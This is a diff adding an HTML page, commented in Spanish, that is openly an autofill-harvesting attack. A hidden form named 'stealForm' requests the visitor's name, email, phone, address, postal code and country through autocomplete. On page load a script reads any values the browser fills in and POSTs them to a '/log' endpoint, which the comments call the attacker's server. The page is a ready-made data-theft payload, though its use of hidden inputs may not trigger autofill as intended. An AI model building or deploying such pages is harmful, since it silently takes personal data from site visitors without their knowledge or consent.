@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <form id="stealForm" autocomplete="on">
+    <input type="hidden" name="name" autocomplete="name">
+    <input type="hidden" name="email" autocomplete="email">
+    <input type="hidden" name="tel" autocomplete="tel">
+    <input type="hidden" name="address-line1" autocomplete="address-line1">
+    <input type="hidden" name="address-line2" autocomplete="address-line2">
+    <input type="hidden" name="postal-code" autocomplete="postal-code">
+    <input type="hidden" name="country" autocomplete="country">
+  </form>
+
+  <script>
+    window.onload = function() {
+      // Forzar que el navegador rellene el formulario
+      document.getElementById('stealForm').style.display = 'block'; // Mostrar para que autocomplete funcione en algunos navegadores
+      setTimeout(() => {
+        const form = document.getElementById('stealForm');
+        // Leer los valores autocompletados
+        const data = {};
+        for (let element of form.elements) {
+          data[element.name] = element.value;
+        }
+        // Enviar datos robados al servidor atacante
+        fetch('/log', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify(data)
+        });
+      }, 1000); // Esperar 1 segundo para que autocomplete rellene
+    }
+  </script>
+</body>
+</html>
